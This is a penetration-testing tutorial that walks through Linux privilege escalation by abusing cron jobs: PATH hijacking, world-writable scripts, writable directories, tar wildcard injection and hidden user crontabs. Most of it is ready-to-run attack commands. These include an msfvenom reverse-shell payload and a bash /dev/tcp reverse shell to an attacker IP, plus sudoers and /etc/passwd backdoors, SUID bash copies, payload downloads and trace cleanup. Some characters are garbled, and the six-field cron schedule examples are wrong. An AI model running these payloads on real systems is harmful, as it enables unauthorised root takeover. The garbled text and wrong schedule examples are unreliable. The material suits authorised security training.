---
title: Exploiting Cron Jobs ğŸ€
---
Credits to [Juggernaut Pentesting Academy](https://juggernaut-sec.com/cron-jobs-lpe/)

# What are Cron Jobs?

Cron jobs are Linuxâ€™s version of scheduled tasks. They can be set to run at practically any interval between once every minute and once every year.

TheÂ **crond**Â daemon enables cron functionality and reads theÂ **crontab**Â (cron tables) to execute any predefined scripts or commands that are listed.

## Understanding Crontabs and Cron Directories

There are two types of crontabs that can be utilized to run cron jobs:

- **The system crontab**Â â€“Â Used it to schedule system-wide jobs â€“ The default system crontab configuration file is located atÂ **/etc/crontab**
- **The user crontab**Â â€“ This file lets users create and edit cron jobs that only apply at the user level â€“ Created using theÂ **crontab -e**Â command and stored inÂ **/var/spool/cron/crontabs**

> Note that crontabs created withÂ **crontab -e**Â commands are only visible to the users who create them. They cannot be enumerated in a standard way, which is why they are considered â€œhidden cron jobsâ€. Standard users cannot even access the directory where they are stored. The the only way a standard user can view their crontab is by using theÂ **crontab**Â command.

In addition to the crontabs, cron jobs can also be added to theÂ **etc/cron.d**Â directory. However, this is bad practice becauseÂ **cron.d**Â is mainly intended for automatic installations and updates.

Alternatively, a root user can also move their scripts into the following directories to schedule their execution (also bad practice):

- **/etc/cron.hourly/**Â â€“ Run all scripts once an hour
- **/etc/cron.daily/**Â â€“ Run once a day.
- **/etc/cron.weekly/**Â â€“ Run once a week.
- **/etc/cron.monthly/**Â â€“ Run once a month.

The only place that root users should be creating cron jobs is in theÂ **/etc/crontab**Â file or in their personal crontab stored inÂ **/var/spool/cron/crontabs/root**.

As attackers, we should keep in mind the other places cron jobs can be created. Good practice isnâ€™t always standard practice, so we should be checking all possible locations where cron jobs can be stored.

## How to Read Cron Jobs in the Crontab File

Finally, we need to know how to read cron jobs. Fortunately, the /etc/crontab file does a pretty good job of explaining it.

```shell
cat /etc/crontab
```

![](Pasted%20image%2020240418003704.png)

First, we can see the cron SHELL and cron PATH, which are essentially the crontabs environmental variables.

- The cron SHELL is used to execute the cron job, like so: /bin/sh -c <command>.
- The cron PATH works the same as any userâ€™s PATH. That way if a command is used in the cron job without the absolute path, the cron job will check each directory in the PATH from left to right until it finds the binary / script.

Next, it shows us the job definition where is we can see how the cron timers are created.

There are six locations where we can add a value to create the schedule that the cron job runs on. The asterisks signify all possible values. For example:

- 5 * * * * * = job runs every 5 minutes
- * 12 * * * 1 = job runs every monday at 12pm
- 52 6 1 * * * = job runs every 1st day of the month a 6:52am

Finally, we have the four predefined cron jobs. These are here to allow the jobs from the other four directories (mentioned above) to execute from a single location.

Now that we understand what cron jobs are, how they work, and the places to find them, letâ€™s see how we can enumerate cron jobs both manually and using tools.

# Hunting for Cron Jobs â€“ Manual Method

For this example, letâ€™s say we found a password in an NFS share folder that belongs to the userÂ **devops**.

After finding the users credentials, we were able to obtain a foothold on the target host by using SSH.

![](Pasted%20image%2020240418003713.png)

> Since we were able to obtain a foothold over SSH, we already have full TTY and will not require a terminal upgrade.

## **Enumerating System Cron Jobs**

The first place we want to check for cron jobs is in the system crontab file.

```shell
cat /etc/crontab
```

![](Pasted%20image%2020240418003722.png)

Here we can see that four cron jobs are running on this host.

The first three run every minute and the last one every five minutes. Also, all of the cron jobs run as root.

Additionally, we can also see the cron PATH has been edited to includeÂ **/dev/shm**, which is a world-writable folder.

The crontab file is where we would typically find custom cron jobs; however, as mentioned earlier there are also other places (directories) they can be executed from.

If we did not find any cron jobs in the crontab file, or if these ones cannot be exploited, we can check for custom jobs in all of the cron directories with the following command:

```shell
ls -l /etc/cron*
```

![](Pasted%20image%2020240418003729.png)

Here we can see that all five additional directories where cron jobs can execute from. Unfortunately, no custom cron jobs were found in any of these directories. These are all standard jobs commonly found in these directories by default.

## Enumerating User Cron Jobs

Now that we have enumerated all the system crontabs, we can check for user ones (hidden cron jobs).

As mentioned earlier in the post, standard users cannot even access the directory where user cron jobs are stored.

```shell
ls -l /var/spool/cron/crontabs
```

![](Pasted%20image%2020240418003741.png)

And when we check the /var/spool/cron folder permissions, we can see why.

```shell
ls -l /var/spool/cron | grep "crontabs"
```

![](Pasted%20image%2020240418003748.png)

Here we see that the file is owned by root and the crontab group. Since we are neither, we fall under the third set, which only has the â€œsticky bitâ€ set, represented by a â€˜Tâ€™.

> A Sticky bit is a permission bit that is set on a file or a directory that lets only the owner of the file/directory or the root user to delete or rename the file.

Essentially, the sticky bit just makes it so that standard users can only edit their own cron jobs created with theÂ **crontab -e**Â command.

For that reason, we will have to think of an alternative way that we can view them â€“ if they exist.

> There is a way to determine if hidden cron jobs are running, which we will see when we exploit a hidden cron job later in the post.

Next, letâ€™s see how well LinPEAS finds cron jobs for us.

# Hunting for Cron Jobs Using Tools â€“ LinPEAS Method

LinPEAS is the ultimate post-exploitation enumeration tool because it provides a HUGE amount of information. After running it on the victim, we will see all of the same things we found with our manual enumeration, plus much more.

However, it was important to show the manual steps before using tools so that we understand the output of our tools and what to look for.

> If you do not have a copy of LinPEAS, you can grab oneÂ **[here](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)**.

Generally when we run LinPEAS, we will run it without parameters to run â€˜all checksâ€™ and then comb over all of the output line by line, from top to bottom.

> A good trick when running the full scan is to redirect the output of PEAS to a file for quick parsing of common vulnerabilities and keywords usingÂ **grep**.

After grabbing a copy of LinPEAS, we need to transfer a copy onto the victim.

## Downloading LinPEAS onto the Victim

This can be done a number of ways, but for this example we will download it from a web-server that we quickly whip up on our attacker machine.

To start, we need to setup an HTTP server on our attacker machine from the directory whereÂ **linpeas.sh**Â is located.

```shell
python3 -m http.server 80
```

![](Pasted%20image%2020240418003759.png)

Then, back on the victim machine, we can use the following commands to move to theÂ **/tmp**Â directory, download LinPEAS, and then give it execute permissions.

```shell
cd /tmp
wget http://172.16.1.30/linpeas.sh
chmod 755 ./linpeas.sh
```

![](Pasted%20image%2020240418003807.png)

## Executing LinPEAS and Finding All of the System Cron Jobs

With our tool all ready to use, we can just use the commandÂ **./linpeash.sh**Â and the script will execute.

Once it finishes running, we need to locate theÂ **Cron jobs**Â sub-section, which can be found in theÂ **Processes, Crons, Timers, Services and Sockets**Â section.

![](Pasted%20image%2020240418003815.png)

![](Pasted%20image%2020240418003822.png)

Here we can see that LinPEAS enumerated all of the same information about the cron jobs that we found manually (crontab + 4 cron directories).

> **anacron**Â is aÂ computer programÂ that performs periodic command scheduling, which is traditionally done byÂ cron, but without assuming that the system is running continuously. Thus, it can be used to control the execution of daily, weekly, and monthly jobs

LinPEAS also checks our current users permissions in the cron PATH, as well as the directories housing any scripts that are ran using the absolute path.

Due to this check, we can see red/yellow findings in the theÂ **/opt/scripts**Â andÂ **/dev/shm**Â directories, which means our current user has write permissions in those directories!

Additionally, we can see a red/yellow finding for the cron job running theÂ **tar**Â command. This is due to command ending with a wildcard (asterisk), which is a known vulnerability.

> Red/Yellow in LinPEAS = 95% chance that the finding can be exploited for privilege escalation.

Moving on, we will review and exploit each of the cron jobs that we found running on the victim â€“ individually.

For each example, we will assume that we just obtained a foothold on the target host and then we did some basic manual enumeration. After not seeing much from the manual enumeration, we decided to load up LinPEAS to help enumerate the host for us; and in each example, we will find a different cron job running.

# Exploiting Cron Jobs â€“ Cron PATH

For the first example, we can see the crontab has a red/yellow finding in the cron PATH.

Additionally, we can see that there is a cron job running every minute as root!

![](Pasted%20image%2020240418003830.png)

## Determining How we are Going to Exploit the Cron Job

Earlier, we learned that cron jobs that do NOT have the absolute path to a binary or script being executed, will rely on the the cron PATH to find it. If this is the case, the cron job will check each directory in the cron PATH from left to right until the binary or script is found.

Armed with this information, we can check where theÂ **sytemctl**Â binary is executing from by searching for it with theÂ **find**Â command.

```shell
find / -iname systemctl 2>/dev/null
```

![](Pasted%20image%2020240418003838.png)

This tells us thatÂ **systemctl**Â executes from theÂ **/usr/bin**Â directory.

Looking at the cron PATH,Â **/usr/bin**Â is the last directory listed. That means that our current user has write permissions on a directory earlier in the PATH.

The red/yellow finding onÂ **/dev/shm**Â indicates that we have write permissions on that directory. To confirm this, we can issue the following command:

```shell
ls -la /dev | grep "shm"
```

![](Pasted%20image%2020240418003847.png)

Here we see â€œwâ€ across the board, which means we can write in this directory.

> **/dev/shm**Â is similar toÂ **/tmp**Â in that it is a universal world writable directory.

Putting it all together, we have a cron job running every minute as root, executing theÂ **systemctl**Â command without the absolute PATH, and a writable directory earlier in the cron PATH than where the binary executes from.

To exploit this cron job, all we have to do is craft a malicious payload named â€œsystemctlâ€ and drop it in theÂ **/dev/shm**Â folder.

Afterwards, when the cron job runs, it will ride the cron PATH to search for theÂ **systemctl**Â binary. SinceÂ **/dev/shm**Â is at the front of the PATH, it will stop there first and run our malicious payload instead of executing the legitimateÂ **systemctl**Â binary fromÂ **/usr/bin**.

So now, our next objective is to craft a malicious binary named â€œsystemctlâ€.

## Setting up the Exploit and Getting a Root Shell

Heading over to our attacker machine, we can craft a malicious binary and name it systemctl usingÂ **msfvenom**.

```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 -f elf -o systemctl
```

![](Pasted%20image%2020240418003903.png)

Now that our payload has been created, we can download it onto the victim machine.

Earlier we setup an HTTP server in our working directory to download LinPEAS onto the victim host. We can use this to download our payload onto the victim now as well.

On the victim machine, change directories to the /dev/shm directory and then download the payload.

```shell
cd /dev/shm
curl 172.16.1.30/systemctl -o systemctl
```

![](Pasted%20image%2020240418003910.png)

Here we can see the exploit downloaded successfully; however, it is still not ready. In order for the cron job to execute our binary, we need to give is execute permissions.

```shell
chmod 755 ./systemctl
```

![](Pasted%20image%2020240418003917.png)

Perfect! The payload is ready and should trigger every minute. All that is left to do is start a netcat listener on out attacker machine and grab the root shell next time the cron job runs.

And in less than a minute. a root shell checks in!

![](Pasted%20image%2020240418003929.png)

## Bonus â€“ Replacing syctemctl Binary with a â€œScriptâ€

There is actually a pretty cool trick we can do when creating our maliciousÂ **systemctl**Â binary.

Due to the way cron jobs work, the cron SHELL executes the binary / scripts in the crontab by callingÂ **/bin/sh -c â€œ<command_in_cron_job>â€**

![](Pasted%20image%2020240418003935.png)

This means that we can actually make a maliciousÂ **systemctl**Â â€œbinaryâ€ by crafting a â€œscriptâ€ instead.

> Both â€œbinaryâ€ and â€œscriptâ€ are in quotations because this is neither. This is literally just a command in a file with execute permissions.

Since the cron job will run the file withÂ **/bin/sh -c**, all we have to do is echo a single malicious command into a file namedÂ **systemctl**, and then the cron job will execute it just as if it was a binary.

For example, we could give our current user full sudo permissions with the following:

```shell
echo 'echo "devops ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' > /dev/shm/systemctl
```

![](Pasted%20image%2020240418003944.png)

Next, we need to give the script execute permissions.

```shell
chmod 755 /dev/shm/systemctl
```

![](Pasted%20image%2020240418003952.png)

Now we just need to wait a minute and then test theÂ **sudo -l**Â command to see if it worked.

![](Pasted%20image%2020240418004005.png)

BOOM! The script executed and gave full sudo permissions to our current user.

Now we can simply run the following command and become root â€“ no password necessary:

```shell
sudo su -
```

![](Pasted%20image%2020240418004020.png)

# Exploiting Cron Jobs â€“ Weak File Permissions

In the second example, we reviewed the LinPEAS output and found that there werenâ€™t any red/yellow findings whatsoever.

![](Pasted%20image%2020240418004028.png)

Regardless, we did see a cron job running every minute as root. We can also see that the cron job is running a script in theÂ **/opt/scripts**Â directory using the absolute path.

Even without this being a red/yellow finding, it is worth a closer look!

## **Determining How we are Going to Exploit the Cron Job**

At this point we do not know if we can write to this script, so that is the first thing we need to check in order to determine if we can exploit this cron job.

First, we should check our permissions on theÂ **/opt/scripts**Â directory.

```shell
ls -l /opt | grep "scripts"
```

![](Pasted%20image%2020240418004047.png)

This shows us that the scripts directory is owned by root and that our user only has read / execute permissions.

However, we could have write permissions on theÂ **health-check.sh**Â script itself, so letâ€™s check that next.

```shell
ls -l /opt/scripts | grep "health-check.sh"
```

![](Pasted%20image%2020240418004102.png)

Perfect! Even though we do not have write permissions at the folder level, the file itself is world writable!

This means that we can either replace this file with a malicious one, or edit it so that it executes a malicious command for us.

Next, we should read the script to see what it is doing. This will help us determine if its better to edit or replace the file.

```shell
cat /opt/scripts/health-check.sh
```

![](Pasted%20image%2020240418004156.png)

The script is used to check if the web server is up and running. More importantly, we can see a loop and that the script also exits after itâ€™s tests are done.

This means that we cannot append a malicious command to the bottom of the script, because it will never execute. For example, if the first condition in the loop is true, it will finish running the script right there. The script would never get to our command.

Butâ€¦ we do have full TTY from our SSH session, so we can open the script in a text editor such as vim, nano, etc. and then edit it directly on the victim host.

This way, we will be able to place our malicious command at the start of the script so that it runs before the loop.

## **Setting up the Exploit and Getting a Root Shell**

For this example, we will add the following command to the script:

```shell
cp /bin/bash /tmp && chmod +s /tmp/bash
```

This tells the script to copy the /bin/bash binary into /tmp, and then set the SUID bit on the copy of bash.

Next, we need to find which text editors are installed. To do this, we will just try to open the script using the common ones, starting withÂ **vim**:

```shell
vim /opt/scripts/health-check.sh
```

![](Pasted%20image%2020240418004207.png)

Perfect! vim was installed and we were able to add our command as the first thing the script executes.

Now we wait.

But not for long, because after less than a minute, our SUID bash binary appears in the /tmp directory!

![](Pasted%20image%2020240418004220.png)

Awesome! The cron job ran our malicious command before running the rest of the script and as a result, a SUID bash binary was created!

Since the bash binary is owned by root, we can use it to easily drop into a root shell.

```shell
/tmp/bash -p
```

![](Pasted%20image%2020240418004227.png)

# **Exploiting Cron Jobs â€“ Weak Directory Permissions**

This example is very similar to the last one; however, to make it unique we will review an interesting use case that involves a missing script.

Checking the LinPEAS output, we can see that this cron job looks very similar to the last one we saw, but this time it has been labelled a red/yellow finding.

![](Pasted%20image%2020240418004304.png)

## **Determining How we are Going to Exploit the Cron Job**

Seeing /opt/scripts as red/yellow indicates that our current user should have write permissions in that directory.

To confirm this, we can use the following command:

```shell
ls -l /opt | grep "scripts"
```

![](Pasted%20image%2020240418004315.png)

Great! This confirms that our current user does have write permissions in theÂ **/opt/scripts**Â directory!

This means that we should be able to copy (backup) the current script, and then replace it with something malicious.

However, when we check for the script, we cannot find itâ€¦

```shell
ls -l /opt/scripts
```

![](Pasted%20image%2020240418004323.png)

I guess that means we wonâ€™t be able to exploit this cron job since the script doesnâ€™t exist?!

Actually â€“ not true at all! We definitely still can exploit this cron job!

Since we have write permissions in theÂ **/opt/scripts**Â directory, we can just create the script ourselves.

## Setting up the Exploit and Getting a Root Shell

For this example, we will create a reverse shell payload and name the scriptÂ **backup.sh**.

```shell
echo '#!/bin/bash' > /opt/scripts/backup.sh
echo "" >> /opt/scripts/backup.sh
echo 'bash -i >& /dev/tcp/172.16.1.30/443 0>&1' >> /opt/scripts/backup.sh
```

![](Pasted%20image%2020240418004332.png)

After the script is created, we need to give it execute permissions.

```shell
chmod 755 /opt/scripts/backup.sh
```

![](Pasted%20image%2020240418004340.png)

Finally, we need to go back to our attacker machine and start a netcat listener on port 443. Then after less than a minute, our root shell should check in.

![](Pasted%20image%2020240418004359.png)

# Exploiting Cron Jobs â€“ tar Wildcard Injection

To switch things up a bit, letâ€™s say that for this example we got a foothold on the target by exploiting a webserver running on port 80.

This time, we obtained a foothold as the userÂ **www-data**Â after finding a way to upload a PHP script and execute it.

![](Pasted%20image%2020240418004412.png)

## Upgrading Shell to Full TTY

Due to the fact that we got this shell using netcat, we should try to upgrade to full TTY.

Keep in mind, this step is NOT necessary for this specific example to work â€“ itâ€™s just good practice.

> Itâ€™s always a good idea to try and upgrade a basic shell (terminal) to full TTY. If you are interested, I break down why it is important in my post on manual enumerationÂ **[here](https://juggernaut-sec.com/manual-enumeration-lpe/#Terminal_Upgrade_to_Full_TTY "here")**.

```shell
python3 -c 'import pty;pty.spawn("/bin/bash");'
CTRL + Z         #backgrounds netcat session
stty raw -echo
fg               #brings netcat session back to the foreground
export TERM=xterm
```

![](Pasted%20image%2020240418004443.png)

Now that we have full TTY, we can use arrows to go through our command history, use tab completion, clear the terminal, and much more.

## Reviewing LinPEAS Output

Just like the previous examples, letâ€™s fast-forward and say that we already did some basic manual enumeration. After not seeing much from the manual enumeration, we decided to run LinPEAS and now we are reviewing the output.

![](Pasted%20image%2020240418004451.png)

Here we can see a cron job that is running every 5 minutes as root. We can also see that the finding is red/yellow on both the directory and the command.

The cron job starts by using theÂ **cd**Â command to navigate to the webroot directory. From there, theÂ **tar**Â command is executed to compresses all the files within the directory and save the backup file in theÂ **/root/website**Â directory.

## Determining How we are Going to Exploit the Cron Job

**www-data**Â ownsÂ **/var/www**, so this account should definitely have write permissions inÂ **/var/www/html**. That is why it came up red/yellow.

Additionally, we can see that theÂ **gz ***Â portion of the command is also red/yellow. This is because there is a wildcard at the end of the command to allowÂ **tar**Â to compress all of the files inside the directory at once.

However, this also opens the door to a wildcard injection vulnerability.

Because a wild card is being used, we can actually create files that are named different switches, andÂ **tar**Â will execute them when it compresses everything in the directory.

For a PoC, we can create a file that is named after the switchÂ **â€“index-file=output.txt**. Then once the cron job runs, it will execute the switch and output.txt will be written by root.

```shell
touch '/var/www/html/--index-file=output.txt'
```

![](Pasted%20image%2020240418004506.png)

And sure enough, after a few minutes the output.txt file appears and it is owned by root!

![](Pasted%20image%2020240418004511.png)

Perfect! This Confirms that we can get malicious with this cron job!

This works this way because the wildcard in the command line getâ€™s replaced by the name of all files in the directory. For example, this is how it would have looked when the cron job ran before we added the â€œswitchâ€ file to the directory:

```shell
tar -czf /root/website/backup.tar.gz index.html info.php monkey.php webshell.php
```

However, when we added a file to the directory that was named as a switch, it turned into this:

```shell
tar -czf /root/website/backup.tar.gz --index-file=output.txt index.html info.php monkey.php webshell.php
```

Because the â€œswitchâ€ file starts with â€˜â€“â€˜, it will be the first â€œfileâ€ that gets tarred.

> I put â€œfileâ€ in quotes because â€“ yes we did make a file â€“ but when tar runs, it doesnâ€™t see it as a file. To tar, itâ€™s just a switch.

By quickly removingÂ **output.txt**Â from the directory and then running the PoC, we can see we get an error since we are not root (cannot write in /root). However, we can also see that the output.txt file gets created. To confirm that we created this file (not the cron job), we can see that the owner is not root this time, itâ€™s www-data.

![](Pasted%20image%2020240418004521.png)

Now that we understand how this works, letâ€™s see how we can get malicious using different tar switches.

Using the â€“help switch, we can see all of the available switches; however, there are two specific ones we are looking for.

![](Pasted%20image%2020240418004530.png)

The switches we are interested in are the two checkpoint ones highlighted above. By making â€œfilesâ€ named as these switches, we will be able to execute a file.

When the cron job uses tar to compress the directory, it will execute the first checkpoint switch, which will start the checkpoint. Once the checkpoint starts, the checkpoint-action switch will trigger and execute a file for us.

## Setting up the Exploit and Getting a Root Shell

Alright, the first thing we need to do is create the file that will execute in the secondÂ **â€“checkpoint**Â switch.

For this example, we will make a bash script that creates a root user in theÂ **passwd**Â file.

To do this, we need to jump over to our attacker machine and then create a hashed password usingÂ **openssl**. For simplicity, we will just use â€˜passwordâ€™ as the password.

```shell
openssl passwd password
```

![](Pasted%20image%2020240418004538.png)

After running the command we are provided a hash valueÂ **ShuKpZV7v9akI**Â â€“ keep this handy as we will need it for our next command.

Next, we will create a script that will add a second root userÂ **â€œr00tâ€**Â into the passwd file

```shell
echo '#!/bin/bash' > /var/www/html/rootme.sh
echo "" >> /var/www/html/rootme.sh
echo 'echo "r00t:ShuKpZV7v9akI:0:0:root:/root:/bin/bash" >> /etc/passwd' >> /var/www/html/rootme.sh
```

![](Pasted%20image%2020240418004545.png)

Script looks good! We just need to give it execute permissions so that tar can execute it for us.

```shell
chmod 755 ./rootme.sh
```

Next we need to create our switch â€œfilesâ€ to run this script for us.

```shell
touch '/var/www/html/--checkpoint=1'
touch '/var/www/html/--checkpoint-action=exec=sh rootme.sh'
```

![](Pasted%20image%2020240418004553.png)

Everything is set and now for the moment of truthâ€¦

Checking the passwd file less than a minute later, we can see that the r00t user was created!

```shell
cat /etc/passwd | grep r00t
```

![](Pasted%20image%2020240418004602.png)

Great! The exploit worked and created a root user. Now we can simply become r00t using theÂ **su**Â command and typingÂ **password**Â as the password when prompted.

![](Pasted%20image%2020240418004612.png)

BOOM! Just like that we drop into a root shell.

# Exploiting Cron Jobs â€“ Hidden Cron Jobs

For the final example, we have SSHâ€™d into the host again as theÂ **devops**Â user and just finished running LinPEAS.

One major difference when compared to the other examples, is that this time LinPEAS did not find a single custom cron job running in the /etc/crontab file.

![](Pasted%20image%2020240418004622.png)

Additionally, no custom cron jobs were running from any of the /etc/cron* directories.

At this point, it would appear that a cron job exploit is NOT likely going to be the way that we will escalate privileges.

Fortunately for us, thatâ€™s not entirely true because we still donâ€™t know if any user cron jobs are running.

## Determing if the Cron Daemon is Running

Earlier in the post we learned about the user crontab, which is a file that lets users create and edit cron jobs that apply at the user level. We also learned that these scripts are stored in theÂ **/var/spool/cron/crontabs**Â directory, which standard users are denied access to.

If we do NOT find any cron jobs running in the /etc/crontab or any of the other /etc/cron* directories, we should first confirm whether the cron daemon is even running.

```shell
ps -efw | grep -i "cron"
```

![](Pasted%20image%2020240418004630.png)

Ok, here we can see the cron daemon is running, which means there is still a chance that a user cron job could be running â€“ and hopefully as root.

## Hunting for Hidden Cron Jobs Using PsPy

There is a great tool that we can use to view running process in real-time calledÂ **[pspy](https://github.com/DominicBreuker/pspy "pspy")**.

> pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute.

After grabbing a copy of both the 32-bit and 64-bit version of the tool on our attacker machine, we need to transfer a copy onto the victim.

Since this victim is running an x64 arch, we will send the 64-bit version over.

On our attacker machine, we can place a copy of pspy in our working directory, which is currently still hosting an HTTP server. An then back on the victim, we can grab a copy using the following command:

```shell
cd /dev/shm
curl 172.16.1.30/pspy64 -o pspy64
```

Next, we need to give the binary execute permissions.

```shell
chmod 755 ./pspy64
```

![](Pasted%20image%2020240418004640.png)

Now that the tool is ready to use, we can execute it and wait to see if any interesting traffic pops up.

![](Pasted%20image%2020240418004653.png)

After a few minutes, not only can we clearly see that a cron job is running every minute, it is also running as root!

![](Pasted%20image%2020240418004703.png)

Amazing! Using pspy we are able to find a â€œhiddenâ€ cron job that is running.

Now that we have found what we were looking for, we can exit out of pspy by usingÂ **CTRL + C**.

## Determining How we are Going to Exploit the Cron Job

Having just discovered that a cron job is running on the victim, the next step is to check our permissions on both the directory and the script itself.

First, we should check our permissions on theÂ **/opt/scripts**Â directory where the script is executing from.

```shell
ls -l /opt | grep "scripts"
```

![](Pasted%20image%2020240418004713.png)

Perfect! We found we have write permissions on theÂ **/opt/scripts**Â directory!

Next, we should still check who owns the file to see if we can edit it directly or not.

```shell
ls -l /opt/scripts | grep "test-connect.sh"
```

![](Pasted%20image%2020240418004719.png)

Since we have write permissions on the directory and not on the file, we cannot edit the script like we did earlier â€“ permission denied!

With this discovery, we have determined that the only way to exploit this cron job is to replace the script with something malicious.

> Actually, there is a way we could write to the script. Something interesting happens when the file is moved, which we will see coming up.

Moving on, letâ€™s quickly check what the script is doing.

```shell
cat /opt/scripts/test-connect.sh
```

![](Pasted%20image%2020240418004728.png)

Alright, this is just a simple script that uses an if/else statement to check if the network is up or down.

## Setting up the Exploit and Getting a Root Shell

Regardless of what it does â€“ we cannot edit it, so we will move the original script to a directory we can write to, then replace this script with a malicious version.

```shell
mv /opt/scripts/test-connect.sh /dev/shm
```

![](Pasted%20image%2020240418004736.png)

Interestingly, once the file has been moved devops becomes the file owner. This means that we could edit the script after moving it, and then move it back to the scripts folder.

Instead, we will continue with our original plan and replace the current script with a malicious one.

> Why was the file NOT owned by root when it was moved? â€“ ACLs prevented the file from being owned by root when it was moved by devops; therefor, the system was forced to make devops the owner of the â€œnewâ€ file. The easiest way to think of it is that devops cannot assign root as a file owner; however, root can assign any user as a file owner.

Since we have already used cron jobs to get root 4 different ways, we will just keep it simple this time and make another SUID bash binary in the /tmp folder.

```shell
echo '#!/bin/bash' > /opt/scripts/test-connect.sh
echo "" >> /opt/scripts/test-connect.sh
echo 'cp /bin/bash /tmp && chmod +s /tmp/bash' >> test-connect.sh
```

![](Pasted%20image%2020240418004748.png)

And in less than a minute, a new SUID bash binary appears in the /tmp directory!

![](Pasted%20image%2020240418004756.png)

Since the bash binary is owned by root, we can use it to easily drop into a root shell.

```shell
/tmp/bash -p
```

![](Pasted%20image%2020240418004802.png)

Donâ€™t forget to clean up the script and restore it from backup and make root the owner again!

```shell
mv /dev/shm/test-connect.sh /opt/scripts/
chown root:root /opt/scripts/test-connect.sh
```

![](Pasted%20image%2020240418004811.png)

Perfect! Everything is now restored to how it was like we were never here!